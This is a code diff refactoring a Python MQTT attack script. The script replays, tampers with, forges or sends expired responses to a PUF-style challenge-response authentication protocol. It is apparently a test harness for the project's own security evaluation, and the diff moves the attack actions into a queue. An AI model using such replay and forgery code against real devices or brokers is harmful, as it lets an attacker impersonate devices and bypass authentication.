@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import argparse
 import json
+import queue
 import secrets
 import sys
 import threading
@@ -59,14 +60,14 @@ def expired_payload(uid: str, time_window: int) -> dict[str, str]:
 
 def run_attack(args: argparse.Namespace) -> None:
     client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"puf-attack-{secrets.token_hex(4)}")
-    action_done = threading.Event()
     connected = threading.Event()
     connection_error: list[str] = []
+    pending_action: queue.Queue[tuple[str, dict[str, str], str]] = queue.Queue(maxsize=1)
 
     def on_connect(client, userdata, flags, reason_code, properties):
-        if getattr(reason_code, "is_failure", False) or int(reason_code) != 0:
+        if getattr(reason_code, "is_failure", reason_code != 0):
             connection_error.append(f"MQTT connection failed: {reason_code}")
-            action_done.set()
+            connected.set()
             return
         connected.set()
         client.subscribe(args.challenge_topic, qos=1)
@@ -80,35 +81,30 @@ def run_attack(args: argparse.Namespace) -> None:
         if not isinstance(payload, dict) or payload.get("uid") != args.uid:
             return
         if message.topic == args.response_topic:
-            try:
-                if args.mode == "replay":
-                    _publish(client, args.response_topic, payload, "replay")
-                elif args.mode == "tamper":
-                    _publish(client, args.response_topic, tamper_payload(payload), "tamper")
-                else:
-                    return
-            except (RuntimeError, TimeoutError) as exc:
-                connection_error.append(str(exc))
-            action_done.set()
-            client.disconnect()
+            if args.mode == "replay":
+                pending_action.put((args.response_topic, payload, "replay"))
+            elif args.mode == "tamper":
+                pending_action.put(
+                    (args.response_topic, tamper_payload(payload), "tamper")
+                )
         elif message.topic == args.challenge_topic:
-            try:
-                if args.mode == "forge":
-                    _publish(client, args.response_topic, forge_payload(args.uid, payload), "forge")
-                elif args.mode == "expired":
-                    # No key is used or required by this attacker.
-                    _publish(
-                        client,
+            if args.mode == "forge":
+                pending_action.put(
+                    (
+                        args.response_topic,
+                        forge_payload(args.uid, payload),
+                        "forge",
+                    )
+                )
+            elif args.mode == "expired":
+                # No key is used or required by this attacker.
+                pending_action.put(
+                    (
                         args.response_topic,
                         expired_payload(args.uid, args.time_window),
                         "expired",
                     )
-                else:
-                    return
-            except (RuntimeError, TimeoutError) as exc:
-                connection_error.append(str(exc))
-            action_done.set()
-            client.disconnect()
+                )
 
     client.on_connect = on_connect
     client.on_message = on_message
@@ -118,10 +114,18 @@ def run_attack(args: argparse.Namespace) -> None:
         raise RuntimeError(f"MQTT connection failed: {exc}") from exc
     client.loop_start()
     try:
-        if not action_done.wait(args.timeout):
+        try:
+            topic, payload, action = pending_action.get(timeout=args.timeout)
+        except queue.Empty:
+            if connection_error:
+                raise RuntimeError(connection_error[0])
             if not connected.is_set():
                 raise TimeoutError("timed out waiting for MQTT connection")
             raise TimeoutError(f"timed out waiting for {args.mode} attack trigger")
+        try:
+            _publish(client, topic, payload, action)
+        except (RuntimeError, TimeoutError) as exc:
+            connection_error.append(str(exc))
         if connection_error:
             raise RuntimeError(connection_error[0])
     finally:
